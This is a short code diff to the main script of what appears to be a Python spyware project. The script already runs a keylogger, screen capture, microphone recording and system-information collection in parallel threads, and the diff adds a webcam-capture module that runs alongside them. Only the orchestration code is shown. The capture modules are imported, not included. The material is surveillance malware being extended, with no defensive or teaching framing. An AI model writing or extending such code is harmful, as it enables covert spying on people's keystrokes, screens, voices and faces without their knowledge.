@@ -6,6 +6,7 @@ from src.keylogger import KeyLogger
 from src.system_info import SysInfo
 from src.screenshots import Screenshots
 from src.microphone import Microphone
+from src.webcamera import WebCamera
 
 from src.make_dir import run
 
@@ -28,6 +29,10 @@ def keylogger():
     k = KeyLogger()
     k.run()
 
+def web_camera():
+    w = WebCamera()
+    w.every_time()
+
 
 if __name__ == "__main__":
     with concurrent.futures.ThreadPoolExecutor() as executor:
@@ -36,3 +41,4 @@ if __name__ == "__main__":
         executor.submit(screenshot)
         executor.submit(system_info)
         executor.submit(keylogger)
+        executor.submit(web_camera)
